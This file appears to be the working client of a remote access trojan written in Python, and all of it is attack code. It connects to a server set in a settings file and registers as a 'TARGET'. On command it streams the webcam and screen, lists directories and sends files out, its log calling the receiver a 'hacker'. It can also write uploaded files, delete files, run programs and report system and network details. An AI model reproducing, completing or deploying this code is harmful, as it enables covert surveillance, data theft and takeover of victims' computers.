import socket
import time
import cv2
import pickle
import struct
import os
import psutil
import platform
from datetime import datetime
import uuid
import re
from requests import get
import sys
import mss
import json


with open('settings.json', 'r') as f:
    data = json.load(f)
    IP = data[0]["IP"] 
    PORT = data[0]["PORT"] 
    NAME = data[0]["NAME"] 
    ID = data[0]["ID"] 

    if IP == None and PORT == None and NAME == None and ID == None:
        print("Settings not configured.")
        quit()
        
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def System_information():
    listt = []

    dictionary = {}
    uname = platform.uname()
    user_list = psutil.users()
    usernamee = []
    for user in user_list:
        username = user.name
        usernamee.append(username)

    dictionary.update({"System" : uname.system})
    dictionary.update({"Users": usernamee})
    dictionary.update({"Node Name": uname.node})
    dictionary.update({"Release" : uname.release})
    dictionary.update({"Version": uname.version})
    dictionary.update({"Machine": uname.machine})
    #try:
        #dictionary.update({"Processor":cpuinfo.get_cpu_info()['brand_raw'] })
    #except:
    dictionary.update({"Processor":'Couldnt get details'})
    dictionary.update({"Ip-Address": socket.gethostbyname(socket.gethostname())})
    dictionary.update({"Mac-Address": ':'.join(re.findall('..', '%012x' % uuid.getnode()))})
    listt.append({"System Information": dictionary})

    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)

    dictionary2 = {}
    dictionary2.update({"Boot Time:":f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"})
    listt.append({"Boot Time": dictionary2})



    svmem = psutil.virtual_memory()

    swap = psutil.swap_memory()

    dictionary3 = {}
    dictionary3.update({"Total Physical Memory":get_size(svmem.total)})
    dictionary3.update({"Swap Memory": get_size(swap.total)})
    listt.append({"Memory": dictionary3})



    partitions = psutil.disk_partitions()

    dictionary4 = {}

    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue


        dictionary4.update({partition.device:{"Mountpoint": partition.mountpoint, "File System Type" : partition.fstype}, "Total Size" : get_size(partition_usage.total), "Used" : get_size(partition_usage.used), "Free" : get_size(partition_usage.free)})
    listt.append({"Storage" : dictionary4})

    dictionary5 = {}

    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            if str(address.family) == 'AddressFamily.AF_INET':
                dictionary5.update({interface_name:{"Ip Address": address.address, "Netmask": address.netmask, "Broadcast IP" : address.broadcast}})

            elif str(address.family) == 'AddressFamily.AF_PACKET':


                dictionary5.update({interface_name:{"Ip Address": address.address, "Netmask": address.netmask, "Broadcast IP" : address.broadcast}})
    ip = get('https://api.ipify.org/').text



    dictionary5.update({"Public IP": ip})
    
    listt.append({"Network": dictionary5})
    
    return listt


print('[CONNECTION] Attempting to connect to the server.')

s.connect((IP,PORT))


s.send(bytes(f'TARGET|{NAME}|{ID}','utf-8'))
print('[CONNECTION] Connected to the server.')


print('[LOG] Listening for commands.')

while True:
    command = s.recv(300).decode('utf-8')

    if command == 'GET_CAMERA_FOOTAGE':
        vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)

        print('[COMMAND] Sending camera footage.')

        while True:
            ret, frame = vid.read()

            frame_pkld = pickle.dumps(frame)

            byte_size = len(frame_pkld)
            frame_pckd = struct.pack('Q', byte_size)

            s.send(frame_pckd)
            s.sendall(frame_pkld)

            proceed = s.recv(1).decode()
            
            if proceed == 'Y':
                continue
            else:
                vid.release()
                break

        print('[LOG] Finished sending camera footage.')

    elif command == 'GET_SCREEN_CAPTURE':
        print('[COMMAND] Sending screen capture.')

        screen = mss.mss()
        monitor = screen.monitors[0]

        while True:
            ss = screen.grab(monitor)
            ss_pkld = pickle.dumps(ss)

            byte_size = len(ss_pkld)
            ss_pckd = struct.pack('Q', byte_size)

            s.send(ss_pckd)
            s.sendall(ss_pkld)

            proceed = s.recv(1).decode()
            
            if proceed == 'Y':
                continue
            else:
                break
            
        print('[LOG] Finished sharing screen capture.')

    elif command == 'GET_FILES':
        dir = s.recv(300).decode('utf-8')

        if dir == 'None':
            dir = os.getcwd()

        try:
            files = [f for f in os.listdir(dir) if os.path.isfile(os.path.join(dir, f))]
            folders = os.listdir(dir)
        except:
            dict = {'invalid':'invalid'}
            dict = pickle.dumps(dict)

            s.sendall(dict)
            continue

        to_be_removed = []

        for i in folders:
            if i in files:
                to_be_removed.append(i)

        for i in to_be_removed:
            folders.remove(i)

        dict = {'files':files, 'folders':folders, 'dir':dir}
        dict = pickle.dumps(dict)

        s.sendall(dict)
        print('[LOG] Task completed.')

    elif command == 'DOWNLOAD_FILE':
        dir = s.recv(300).decode('utf-8')
        print(dir)

        try:
            with open(dir, 'rb') as f:
                f.close()
            s.send(bytes('VALID','utf-8'))

        except:
            s.send(bytes('INVALID','utf-8'))
            continue
        
        print('[LOG] Sending file data to hacker.')

        file_size = os.path.getsize(dir)

        s.send(bytes(f"{file_size}",'utf-8'))
        time.sleep(3)

        file = open(dir, 'rb')
        
        data = file.read()
        s.sendall(data)
        file.close()

        print('[LOG] Successfully uploaded a file.')

    elif command == 'UPLOAD':
        details = s.recv(300).decode('utf-8')
        details = details.split('|')

        file_name = details[0]
        path = details[1]

        try:
            f = open(f'{path}\\{file_name}','wb')
        
        except:
            s.send(bytes('INVALID','utf-8'))
            continue

        s.send(bytes('VALID','utf-8'))

        file_size = s.recv(300).decode('utf-8')

        data = s.recv(int(file_size))

        f = open(f'{path}\\{file_name}','wb')
        f.write(data)
        f.close()
        
        print('[LOG] Successfully downloaded a file.')
        
    elif command == 'DELETE':
        file_name = s.recv(300).decode('utf-8')

        try:
            os.remove(file_name)
        except:
            s.send(bytes('INVALID','utf-8'))
            continue

        s.send(bytes('VALID','utf-8'))

        print('[LOG] Successfully deleted a file.')

    elif command == 'RUN':
        file = s.recv(500).decode('utf-8')

        try:
            os.startfile(file)
        except:
            s.send(bytes('INVALID','utf-8'))
        
        s.send(bytes('VALID','utf-8'))

    elif command == 'GET_TARGET_DETAILS':
        details = System_information()
        details = pickle.dumps(details)

        s.send(bytes(f'{sys.getsizeof(details)}','utf-8'))
        time.sleep(1)

        s.sendall(details)
